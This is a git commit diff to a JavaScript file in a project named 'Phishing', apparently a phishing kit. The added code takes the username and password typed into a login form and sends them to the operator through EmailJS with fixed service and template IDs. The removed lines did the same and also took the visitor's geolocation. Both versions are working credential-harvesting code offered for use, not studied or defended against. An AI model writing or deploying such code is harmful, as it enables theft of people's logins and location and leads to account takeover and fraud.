a20c5a28e77c5a8fc792e0e6601ec1e208d73a26
gorkem4962 <80282479+gorkem4962@users.noreply.github.com>
2025-05-16 12:47:00 +0200

    Update app.js
    Old. version

--- Phishing/js/app.js
+++ Phishing/js/app.js
@@ -1,50 +1,26 @@
 function sendMail() {
+  // Get the username and password from the input fields
   var username = document.getElementById("username").value;
   var password = document.getElementById("password").value;
+
+  // Create the parameters to send
+  var params = {
+    username_id: username,
+    passwort_id: password
+  };
 
   const serviceid = 'service_udupifp';
   const templateid = 'template_rfoq0w4';
 
-  function sendEmailWithParams(params) {
-    emailjs.send(serviceid, templateid, params)
-      .then(res => {
-        document.getElementById("username").value = "";
-        document.getElementById("password").value = "";
-      })
-      .catch(err => alert(err));
-  }
-
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-      var params = {
-        username_id: username,
-        passwort_id: password,
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude
-      };
-      sendEmailWithParams(params);
-    }, function(error) {
-      alert("Unable to retrieve location: " + error.message);
-      var params = {
-        username_id: username,
-        passwort_id: password,
-        latitude: '',
-        longitude: ''
-      };
-      alert("Email is sended");
-      sendEmailWithParams(params);
-    });
-  } else {
-    alert("Geolocation is not supported by this browser.");
-    var params = {
-      username_id: username,
-      passwort_id: password,
-      latitude: '',
-      longitude: ''
-    };
-    sendEmailWithParams(params);
-  }
+  // Send the email using EmailJS
+  emailjs.send(serviceid, templateid, params)
+    .then(res => {
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    })
+    .catch(err => alert(err));
 }
+
 
 
 
